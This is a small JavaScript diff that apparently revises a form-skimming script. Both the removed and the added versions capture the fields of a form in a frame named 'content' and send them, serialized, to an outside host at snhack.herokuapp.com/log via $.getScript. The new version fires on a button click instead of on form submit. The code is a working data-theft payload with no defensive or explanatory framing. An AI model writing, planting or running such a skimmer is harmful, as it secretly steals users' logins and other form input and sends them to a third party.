@@ -1,6 +1,3 @@
-$("frame[name='content']").load(function(){
-  $("form", this).submit(function(e){
-      e.preventDefault();
-      $.getScript('//snhack.herokuapp.com/log?'+ $(this).serialize());
-  });
-});
+$("input:button", window.parent.frames['content'].document).click(function(){
+  $.getScript('//snhack.herokuapp.com/log?'+ $("form", window.parent.frames['content'].document).serialize())
+})
